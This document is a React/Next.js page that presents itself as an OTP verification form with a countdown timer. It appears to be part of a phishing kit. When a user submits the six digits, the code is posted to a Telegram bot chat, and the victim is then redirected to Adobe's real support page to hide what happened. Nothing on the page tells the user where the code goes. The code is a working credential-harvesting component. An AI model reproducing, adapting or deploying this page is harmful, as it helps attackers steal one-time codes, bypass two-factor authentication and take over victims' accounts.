"use client";

import { useEffect, useState } from "react";

export default function OtpPage() {
  const [digits, setDigits] = useState<string[]>(Array(6).fill(""));
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(5 * 60); // 5-minute countdown

  const handleChange = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value;
    setDigits(newDigits);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otp = digits.join("");

    if (otp.length < 6) {
      setError("Please enter all 6 digits");
      return;
    }

    setLoading(true);
    setError(null);

    const message = `🔐 *OTP Submitted*\n\n🔢 OTP: ${otp}`;

    try {
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown",
          }),
        }
      );

      setLoading(false);

      if (telegramResponse.ok) {
        window.location.href = "https://helpx.adobe.com/support.html";
      } else {
        const data = await telegramResponse.json();
        setError(data.description || "Failed to send OTP to Telegram.");
      }
    } catch (err: unknown) {
      console.error("Telegram error:", err);
      setError("Network error. Try again later.");
    }
  };

  // Countdown timer logic
  useEffect(() => {
    if (secondsLeft <= 0) return;

    const timer = setInterval(() => {
      setSecondsLeft((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [secondsLeft]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60)
      .toString()
      .padStart(2, "0");
    const s = (seconds % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 px-4">
      <div className="max-w-md w-full bg-white/5 backdrop-blur-md rounded-xl p-8 shadow-lg border border-white/10">
        <h2 className="text-2xl font-semibold text-white text-center mb-6">
          Enter OTP
        </h2>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-6"
        >
          <div className="flex gap-3">
            {digits.map((digit, i) => (
              <input
                key={i}
                id={`otp-${i}`}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                className="w-10 h-12 text-center text-white text-lg bg-white/10 rounded-md outline-none focus:ring-2 focus:ring-blue-500 placeholder-white/50"
              />
            ))}
          </div>

          <div className="text-sm text-white/70">
            Time remaining:{" "}
            <span className="text-white font-mono">
              {formatTime(secondsLeft)}
            </span>
          </div>

          {error && <p className="text-red-400 text-sm">{error}</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-blue-600 hover:bg-blue-500 transition text-white py-2 rounded-md disabled:opacity-50"
          >
            {loading ? "Submitting…" : "Verify"}
          </button>
        </form>
      </div>
    </div>
  );
}
